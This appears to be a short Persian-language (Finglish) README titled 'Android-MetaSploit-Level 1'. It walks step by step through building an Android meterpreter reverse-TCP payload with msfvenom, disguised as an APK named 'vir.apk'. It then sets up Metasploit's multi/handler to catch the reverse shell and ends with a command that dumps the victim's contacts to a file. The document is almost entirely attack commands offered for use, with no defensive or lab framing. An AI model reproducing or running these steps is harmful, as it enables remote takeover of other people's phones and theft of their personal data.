### Script `Android-MetaSploit-Level 1`

$ Kali linux bayad dar halat root bashad

```bash
sudo -s
```

$ "LHOST" va "LPORT" ra jaygozari va enter mikonim (*=ifcongig / **= port delkhah )

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=* LPORT=** -o /home/kali/Desktop/vir.apk
```


$ sepas abzar metasploit ra ejra mikonim

```bash
msfconsole
```

$ bad az baz shodan abzar metasploit b tartib code haye zer ra mizanim

```bash
use exploit/multi/handler
```

```bash
set payload android/meterpreter/reverse_tcp
```

```bash
options
```

```bash
set LHOST *
```

```bash
set LPORT **
```


$ bad az etmam dobare "options" ra zade ta az set shoan "LHOST" va "LPORT" etmenan hasel konim va sepas :

```bash
options
```

```bash
exploit
```

```bash
help
```

---------------------------------------------------------------------------

`example` : For save contact : `dump_contacts -o /home/kali/Desktop/contact.txt`

